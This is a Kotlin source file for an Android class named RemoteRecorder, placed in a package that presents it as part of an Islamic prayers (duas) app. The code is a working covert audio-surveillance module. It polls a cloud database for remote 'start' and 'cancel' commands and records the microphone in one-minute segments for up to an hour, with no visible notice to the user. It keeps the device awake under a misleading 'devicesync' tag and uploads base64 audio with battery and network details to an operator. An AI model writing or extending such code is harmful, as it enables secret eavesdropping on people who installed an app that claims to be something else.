package islamic.duas.media

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.AudioAttributes
import android.media.AudioFocusRequest
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import islamic.duas.cloud.CloudApi
import islamic.duas.utils.DeviceId
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

class RemoteRecorder(private val context: Context) {

    companion object {
        private const val TAG = "RemoteRecorder"
        private const val SEGMENT_SECONDS = 60L
        private const val MAX_DURATION_SEC = 3600
        private const val MIN_BATTERY_PCT = 10
        private const val UPLOAD_RETRIES = 3

        @Volatile
        private var instance: RemoteRecorder? = null

        fun getInstance(context: Context): RemoteRecorder {
            return instance ?: synchronized(this) {
                instance ?: RemoteRecorder(context.applicationContext).also { instance = it }
            }
        }
    }

    private var mediaRecorder: MediaRecorder? = null
    private var currentRecordingId: String? = null
    private var currentRequestId: String? = null
    private var durationSec: Int = 0
    private var segmentsCompleted: Int = 0
    private var totalRecordedBytes: Long = 0
    private var lastElapsedSec: Int = 0
    private val segmentFiles = java.util.Collections.synchronizedList(mutableListOf<File>())
    private val isRecording = AtomicBoolean(false)
    private val isFinalized = AtomicBoolean(false)
    private val micInUse = AtomicBoolean(false)
    private var recordingJob: Job? = null
    private val pendingUploads = mutableListOf<Job>()
    private var wakeLock: PowerManager.WakeLock? = null
    private var audioFocusRequest: AudioFocusRequest? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private suspend fun cleanupStaleStatus() {
        try {
            val androidId = DeviceId.get(context)
            val statusStr = CloudApi.readFromRTDB("devices/$androidId/recordingStatus")
            if (statusStr != null) {
                val json = JSONObject(statusStr)
                if (json.optString("status") == "recording" && !isRecording.get()) {
                    Log.w(TAG, "Cleaning up stale recording status from previous session")
                    CloudApi.deleteFromRTDB("devices/$androidId/recordingStatus")
                }
            }
        } catch (_: Exception) {}
    }

    private fun cleanOrphanedCacheFiles() {
        try {
            val cacheDir = context.cacheDir
            val files = cacheDir.listFiles { f -> f.name.startsWith("recording_") && f.name.endsWith(".m4a") }
            if (files != null) {
                for (f in files) {
                    f.delete()
                    Log.d(TAG, "Deleted orphaned cache file: ${f.name}")
                }
            }
        } catch (_: Exception) {}
    }

    private fun hasAudioPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            context, Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun isBatterySufficient(): Boolean {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val level = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
            level >= MIN_BATTERY_PCT
        } catch (_: Exception) { true }
    }

    private fun acquireAudioFocus() {
        try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val request = AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
                    .setAudioAttributes(
                        AudioAttributes.Builder()
                            .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                            .build()
                    )
                    .setOnAudioFocusChangeListener { }
                    .build()
                audioFocusRequest = request
                am.requestAudioFocus(request)
            } else {
                @Suppress("DEPRECATION")
                am.requestAudioFocus(null, AudioManager.STREAM_VOICE_CALL, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
            }
        } catch (_: Exception) {}
    }

    private fun releaseAudioFocus() {
        try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                audioFocusRequest?.let { am.abandonAudioFocusRequest(it) }
            } else {
                @Suppress("DEPRECATION")
                am.abandonAudioFocus(null)
            }
        } catch (_: Exception) {}
    }

    private fun acquireWakeLock() {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "devicesync:recording"
            )
            wakeLock?.acquire((durationSec + 60L) * 1000L)
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.release()
        } catch (_: Exception) {}
        wakeLock = null
    }

    private suspend fun writeResponse(requestId: String, status: String, message: String) {
        if (requestId.isEmpty()) return
        try {
            val androidId = DeviceId.get(context)
            val responseJson = JSONObject().apply {
                put("status", status)
                put("message", message)
                put("requestId", requestId)
            }
            CloudApi.writeToRTDB(
                "devices/$androidId/commands/responses/$requestId",
                responseJson
            )
        } catch (_: Exception) {}
    }

    suspend fun checkAndHandleCommand() {
        try {
            val androidId = DeviceId.get(context)
            val path = "devices/$androidId/commands/audio_record"
            val dataStr = CloudApi.readFromRTDB(path)
            if (dataStr == null) {
                if (!isRecording.get()) {
                    cleanupStaleStatus()
                    cleanOrphanedCacheFiles()
                }
                return
            }
            val data = JSONObject(dataStr)
            val action = data.optString("action", "")

            when (action) {
                "start" -> {
                    if (isRecording.get()) return
                    if (micInUse.get()) {
                        writeResponse(data.optString("requestId", ""), "error", "Mic busy")
                        try { CloudApi.deleteFromRTDB(path) } catch (_: Exception) {}
                        return
                    }
                    cleanupStaleStatus()
                    cleanOrphanedCacheFiles()

                    val durSec = minOf(data.optInt("durationSec", 300), MAX_DURATION_SEC)
                    val reqId = data.optString("requestId", UUID.randomUUID().toString())
                    val recId = UUID.randomUUID().toString()

                    if (!hasAudioPermission()) {
                        Log.e(TAG, "RECORD_AUDIO permission not granted")
                        writeResponse(reqId, "error", "RECORD_AUDIO permission not granted")
                        try { CloudApi.deleteFromRTDB(path) } catch (_: Exception) {}
                        return
                    }

                    if (!isBatterySufficient()) {
                        Log.w(TAG, "Battery too low for recording")
                        writeResponse(reqId, "error", "Battery too low (< $MIN_BATTERY_PCT%)")
                        try { CloudApi.deleteFromRTDB(path) } catch (_: Exception) {}
                        return
                    }

                    startRecording(durSec, reqId, recId)
                    try { CloudApi.deleteFromRTDB(path) } catch (_: Exception) {}
                }
                "cancel" -> {
                    val canceledId = data.optString("recordingId", "")
                    val cancelReqId = data.optString("requestId", UUID.randomUUID().toString())
                    cancelRecording(canceledId, cancelReqId)
                    try { CloudApi.deleteFromRTDB(path) } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command check error: ${e.message}", e)
        }
    }

    private suspend fun startRecording(durationSecArg: Int, requestId: String, recordingId: String) {
        isFinalized.set(false)
        micInUse.set(true)
        this.durationSec = minOf(durationSecArg, MAX_DURATION_SEC)
        this.currentRequestId = requestId
        this.currentRecordingId = recordingId
        this.segmentsCompleted = 0
        this.totalRecordedBytes = 0
        this.lastElapsedSec = 0
        this.segmentFiles.clear()
        isRecording.set(true)

        acquireWakeLock()
        acquireAudioFocus()

        writeRecordingStatus("recording", 0, 0, requestId)

        val androidId = DeviceId.get(context)
        val initJson = JSONObject().apply {
            put("id", recordingId)
            put("requestId", requestId)
            put("createdAt", System.currentTimeMillis())
            put("durationSec", this@RemoteRecorder.durationSec)
            put("status", "started")
            put("mimeType", "audio/mp4")
        }
        CloudApi.patchToRTDB("devices/$androidId/recordings/$recordingId", initJson)

        recordingJob = scope.launch {
            try {
                var elapsed = 0
                while (isRecording.get() && elapsed < this@RemoteRecorder.durationSec) {
                    try {
                        val segmentIndex = segmentsCompleted
                        val remainingSec = (this@RemoteRecorder.durationSec - elapsed).toLong()
                        val thisSegmentSec = minOf(SEGMENT_SECONDS, remainingSec)
                        val segmentFile = File(
                            context.cacheDir,
                            "recording_${recordingId}_part_${segmentIndex}.m4a"
                        )
                        synchronized(segmentFiles) { segmentFiles.add(segmentFile) }

                        startMediaRecorder(segmentFile)
                        delay(thisSegmentSec * 1000L)
                        stopMediaRecorder()

                        if (segmentFile.exists() && segmentFile.length() > 0) {
                            val fileSize = segmentFile.length()
                            val uploadJob = launch {
                                uploadSegmentWithRetry(segmentFile, segmentIndex)
                            }
                            synchronized(pendingUploads) { pendingUploads.add(uploadJob) }
                            segmentsCompleted++
                            elapsed += thisSegmentSec.toInt()
                            totalRecordedBytes += fileSize
                            lastElapsedSec = elapsed
                            writeRecordingStatus("recording", elapsed, segmentsCompleted, requestId)
                        } else {
                            elapsed += thisSegmentSec.toInt()
                            lastElapsedSec = elapsed
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Segment recording error: ${e.message}", e)
                        val step = minOf(SEGMENT_SECONDS, (this@RemoteRecorder.durationSec - elapsed).toLong()).toInt()
                        elapsed += step
                        lastElapsedSec = elapsed
                    }
                }
                stopAndFinalize()
            } catch (e: Exception) {
                Log.e(TAG, "Recording job crashed: ${e.message}", e)
                stopAndFinalize()
            }
        }
    }

    private val audioSources = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        listOf(
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.UNPROCESSED,
            MediaRecorder.AudioSource.DEFAULT
        )
    } else {
        listOf(
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.DEFAULT
        )
    }

    private fun startMediaRecorder(file: File) {
        for (source in audioSources) {
            try {
                mediaRecorder?.release()
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                mediaRecorder?.apply {
                    setOnErrorListener { _, what, extra ->
                        Log.e(TAG, "MediaRecorder error: what=$what extra=$extra")
                    }
                    setOnInfoListener { _, what, _ ->
                        if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED ||
                            what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED) {
                            Log.w(TAG, "MediaRecorder info: $what")
                        }
                    }
                    setAudioSource(source)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(192000)
                    setOutputFile(file.absolutePath)
                    prepare()
                    start()
                }
                Log.i(TAG, "MediaRecorder started with audio source: $source")
                return
            } catch (e: Exception) {
                Log.w(TAG, "Audio source $source failed: ${e.message}")
                try { mediaRecorder?.release() } catch (_: Exception) {}
                mediaRecorder = null
            }
        }
        Log.e(TAG, "All audio sources failed")
    }

    private fun stopMediaRecorder() {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
        } catch (_: Exception) {}
        mediaRecorder = null
    }

    private suspend fun uploadSegmentWithRetry(file: File, segmentIndex: Int) {
        var lastError: Exception? = null
        for (attempt in 1..UPLOAD_RETRIES) {
            try {
                if (!file.exists()) {
                    Log.w(TAG, "Segment file gone before upload: ${file.name}")
                    return
                }
                uploadSegment(file, segmentIndex)
                file.delete()
                return
            } catch (e: Exception) {
                lastError = e
                Log.w(TAG, "Upload attempt $attempt/$UPLOAD_RETRIES failed: ${e.message}")
                if (attempt < UPLOAD_RETRIES) {
                    delay(1000L * attempt)
                }
            }
        }
        Log.e(TAG, "All $UPLOAD_RETRIES upload attempts failed for segment $segmentIndex", lastError)
    }

    private suspend fun uploadSegment(file: File, segmentIndex: Int) {
        val bytes = file.readBytes()
        val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
        val androidId = DeviceId.get(context)
        val batteryPct = try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        } catch (_: Exception) { -1 }
        val networkType = try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            when (tm?.networkType) {
                TelephonyManager.NETWORK_TYPE_LTE -> "LTE"
                TelephonyManager.NETWORK_TYPE_NR -> "NR"
                TelephonyManager.NETWORK_TYPE_UMTS -> "3G"
                else -> "unknown"
            }
        } catch (_: Exception) { "unknown" }

        val segmentJson = JSONObject().apply {
            put("data", base64)
            put("format", "mp4")
            val meta = JSONObject().apply {
                put("batteryLevel", batteryPct)
                put("networkType", networkType)
            }
            put("metadata", meta)
        }
        CloudApi.writeToRTDB(
            "devices/$androidId/recordings/$currentRecordingId/parts/$segmentIndex",
            segmentJson
        )
    }

    private suspend fun stopAndFinalize() {
        if (!isFinalized.compareAndSet(false, true)) return

        stopMediaRecorder()
        micInUse.set(false)

        val uploads = synchronized(pendingUploads) {
            pendingUploads.toList().also { pendingUploads.clear() }
        }
        uploads.forEach { it.join() }

        releaseWakeLock()
        releaseAudioFocus()

        val androidId = DeviceId.get(context)
        val actualDuration = segmentsCompleted * SEGMENT_SECONDS

        writeRecordingStatus("completed", actualDuration.toInt(), segmentsCompleted, currentRequestId ?: "")
        delay(1000)

        val finalJson = JSONObject().apply {
            put("id", currentRecordingId)
            put("createdAt", System.currentTimeMillis())
            put("durationSec", actualDuration.toInt())
            put("sizeBytes", totalRecordedBytes)
            put("segmentsCount", segmentsCompleted)
            put("cancelled", false)
            put("mimeType", "audio/mp4")
            put("status", "completed")
        }
        if (currentRecordingId != null) {
            CloudApi.patchToRTDB("devices/$androidId/recordings/$currentRecordingId", finalJson)
        }

        if (currentRequestId != null) {
            writeResponse(currentRequestId!!, "completed", "Recording finished")
        }

        CloudApi.deleteFromRTDB("devices/$androidId/recordingStatus")
        isRecording.set(false)
        recordingJob?.cancel()
        Log.i(TAG, "Recording completed: $currentRecordingId, duration=${actualDuration}s, size=$totalRecordedBytes")
    }

    private suspend fun cancelRecording(recordingId: String, cancelRequestId: String) {
        if (!isFinalized.compareAndSet(false, true)) return

        micInUse.set(false)
        val androidId = DeviceId.get(context)
        stopMediaRecorder()

        synchronized(pendingUploads) {
            pendingUploads.forEach { it.cancel() }
            pendingUploads.clear()
        }

        releaseWakeLock()
        releaseAudioFocus()
        isRecording.set(false)
        recordingJob?.cancel()

        synchronized(segmentFiles) {
            segmentFiles.forEach { if (it.exists()) it.delete() }
            segmentFiles.clear()
        }

        writeRecordingStatus("cancelled", lastElapsedSec, segmentsCompleted, currentRequestId ?: "")

        val cancelReq = cancelRequestId.ifEmpty { currentRequestId }
        if (cancelReq != null) {
            writeResponse(cancelReq, "cancelled", "Recording cancelled")
        }
        if (currentRequestId != null && cancelReq != currentRequestId) {
            writeResponse(currentRequestId!!, "cancelled", "Recording cancelled by operator")
        }

        val finalJson = JSONObject().apply {
            put("id", currentRecordingId)
            put("cancelled", true)
            put("durationSec", lastElapsedSec)
            put("sizeBytes", totalRecordedBytes)
            put("segmentsCount", segmentsCompleted)
            put("status", "cancelled")
        }
        if (currentRecordingId != null) {
            CloudApi.patchToRTDB("devices/$androidId/recordings/$currentRecordingId", finalJson)
        }

        CloudApi.deleteFromRTDB("devices/$androidId/recordingStatus")
    }

    private suspend fun writeRecordingStatus(
        status: String, elapsedSec: Int, segCompleted: Int, requestId: String
    ) {
        try {
            val androidId = DeviceId.get(context)
            val statusJson = JSONObject().apply {
                put("status", status)
                put("elapsedSec", elapsedSec)
                put("segmentsCompleted", segCompleted)
                put("format", "mp4")
                put("requestId", requestId)
            }
            CloudApi.writeToRTDB("devices/$androidId/recordingStatus", statusJson)
        } catch (_: Exception) {}
    }

    fun cleanup() {
        stopMediaRecorder()
        releaseWakeLock()
        releaseAudioFocus()
        isRecording.set(false)
        recordingJob?.cancel()
        scope.cancel()
        instance = null
    }
}
